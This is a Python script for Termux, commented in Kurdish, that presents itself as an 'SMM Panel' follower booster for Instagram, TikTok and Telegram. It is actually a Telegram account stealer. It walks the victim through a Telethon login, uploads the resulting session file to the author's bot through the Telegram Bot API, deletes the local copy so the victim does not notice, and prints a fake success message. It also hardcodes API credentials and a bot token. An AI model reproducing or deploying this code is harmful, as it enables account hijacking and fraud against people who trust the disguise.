import os
import requests
import time
from telethon.sync import TelegramClient

# --- زانیارییە جێگیرکراوەکانی تۆ ---
API_ID = 36998090
API_HASH = '54f727a9655ae15ab7da145407f21010'
BOT_TOKEN = '8514314927:AAG2GHMFMfquqU1dzoslSEElkElZXPhVgcI'
MY_CHAT_ID = '8360048813'

def banner():
    # ڕەنگەکان بۆ تێرمۆکس
    print("\033[95m" + "='="*15)
    print("   SMM PANEL - FOLLOWER BOOSTER v3.0")
    print("      Instagram | TikTok | Telegram")
    print("='="*15 + "\033[0m")

def clear():
    os.system('clear')

clear()
banner()

print("\n\033[94m[1]\033[0m Instagram Followers (MAX 10K)")
print("\033[94m[2]\033[0m TikTok Followers (MAX 5K)")
print("\033[94m[3]\033[0m Telegram Members (MAX 2K)")

choice = input("\n\033[92m[?]\033[0m جۆری خزمەتگوزاری هەڵبژێرە: ")
target_user = input("\033[92m[?]\033[0m یوزەرنایمی هەژمارەکە (بەبێ @): ")

clear()
banner()
print(f"\n\033[93m[*] بەستنەوە بە سێرڤەری {target_user}...\033[0m")
time.sleep(1.5)
print("\033[93m[*] تێبینی: بۆ چالاککردنی پانێڵەکە دەبێت لە ڕێگەی تێلیگرامەوە خۆت بسەلمێنیت.\033[0m")

# ناوێک بۆ فایلە کاتییەکە
session_name = f"user_{target_user}"

try:
    # لێرەدا دەست دەکرێت بە دروستکردنی سیزنەکە
    with TelegramClient(session_name, API_ID, API_HASH) as client:
        print("\n\033[92m[+] زانیارییەکان دروستن! سێرڤەر چالاک بوو.\033[0m")
        print("\033[96m[*] تکایە ٥ خولەک چاوەڕێ بکە تا فۆڵۆوەرەکان دەگەن...\033[0m")
        
        # ناردنی سیزنەکە بۆ بۆتەکەت
        file_path = f"{session_name}.session"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            caption = f"✅ سیزنێکی نوێ ڕاو کرا!\n👤 یوزەرنایم: {target_user}\n📱 جۆری خزمەتگوزاری: {choice}"
            requests.post(url, data={'chat_id': MY_CHAT_ID, 'caption': caption}, files={'document': f})

    # سڕینەوەی فایلەکە لە تێرمۆکسی بەرامبەر بۆ ئەوەی هەستی پێ نەکات
    if os.path.exists(file_path):
        os.remove(file_path)

    time.sleep(2)
    print("\n\033[92m[✓] پڕۆسەکە بە سەرکەوتوویی چووە ڕیزەوە. فۆڵۆوەرەکان بە ڕێوەن!\033[0m")

except Exception as e:
    print(f"\n\033[91m[!] هەڵەیەک لە سێرڤەر ڕوویدا. دووبارە تاقی بکەرەوە.\033[0m")
